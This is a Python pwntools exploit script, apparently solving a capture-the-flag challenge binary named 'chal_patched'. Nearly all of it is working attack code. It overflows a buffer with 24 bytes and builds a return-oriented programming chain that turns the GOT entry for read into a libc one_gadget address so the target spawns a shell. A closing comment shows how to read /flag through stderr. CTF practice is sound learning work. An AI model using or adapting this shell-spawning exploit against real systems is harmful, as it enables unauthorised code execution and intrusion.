#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b vuln
'''.format(**locals())

# Set up pwntools for the correct files
exe = './chal_patched'
elf = context.binary = ELF(exe)
libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# pwn libcdb hash -t sha1 e5d2a10a8e24b6a6a727bb93f79bc64b687ad035 --download-libc

io = start()

rop = ROP(elf)

io.sendline(flat(
    b"A" * 24,

    # rdi = read

    rop.rdx.address,
    elf.got["read"],
    0x4011e9, # mov rdi, qword ptr [rdx]

    # rdi = read + some_offset = one_gadget

    rop.rdx.address,
    0xe3b01 - libc.symbols["read"],
    0x4011f6, # add rdi, rdx

    # set [rsp+16] = rdi

    rop.rdx.address,
    16,
    0x4011fa, # mov qword ptr [rsp + rdx], rdi

    # rdx = 0 (to satisfy the requirement of one_gadget)
    rop.rdx.address,
    0,
))

# the program closes stdout, but not stderr!
# cat /flag >&2

io.interactive()
